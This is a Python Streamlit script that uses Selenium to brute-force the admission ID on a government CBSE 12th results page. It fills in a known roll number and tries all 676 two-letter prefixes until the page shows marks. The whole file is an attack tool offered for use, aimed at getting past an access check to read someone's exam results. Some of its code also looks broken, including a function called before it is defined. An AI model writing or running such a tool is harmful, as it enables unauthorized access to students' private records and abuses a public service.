import streamlit as st
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
import time
import string

st.set_page_config(page_title="CBSE Result Brute Forcer", layout="centered")
st.title("🔍 CBSE 12th Result Brute Forcer")

roll_number = st.text_input("Roll Number", value="18615907")
known_last_6 = st.text_input("Known Last 6 Characters", value="074511", max_chars=6)
delay = st.slider("Delay between attempts (seconds)", 1.5, 0.5, 2.5)

if st.button("🚀 Start Brute Force", type="primary"):
    if len(known_last_6) != 6:
        st.error("Last 6 must be exactly 6 characters.")
    else:
        run_brute_force(roll_number.strip(), known_last_6.strip().upper(), delay)

def run_brute_force(roll_number, known_last_6, delay):
    status = st.empty()
    progress = st.empty()
    result = st.empty()

    options = webdriver.ChromeOptions()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")

    driver = None
    try:
        driver = webdriver.Chrome(options=options)
        driver.get("https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html")
        status.success("✅ Started. Searching...")

        letters = string.ascii_uppercase
        count = 0

        for a in letters:
            for b in letters:
                code = f"{a}{b}{known_last_6}"
                count += 1
                progress.info(f"Progress: {count}/676 | Trying **{a}{b}** → `{code}`")

                try:
                    driver.find_element(By.ID, "rroll").clear()
                    driver.find_element(By.ID, "rroll").send_keys(roll_number)

                    driver.find_element(By.ID, "admn_id").clear()
                    driver.find_element(By.ID, "admn_id").send_keys(code)

                    driver.find_element(By.ID, "submit").click()
                    time.sleep(delay)

                    if is_success(driver):
                        result.success(f"""
                        🎉 **SUCCESS FOUND!**

                        **Full Code:** `{code}`
                        **Prefix:** `{a}{b}`
                        """)
                        st.balloons()
                        return
                except:
                    continue

        st.error("❌ Not found after 676 attempts.")

    except Exception as e:
        st.error(f"Error: {e}")
    finally:
        if driver:
            driver.quit()

def is_success(driver):
    try:
        error = driver.find_element(By.ID, "err_msg")
        if error.is_displayed() and error.text.strip():
            return False
    except:
        pass

    page_text = driver.page_source.lower()
    return any(k in page_text for k in ["marks", "subject", "grade", "total", "result", "passed"])
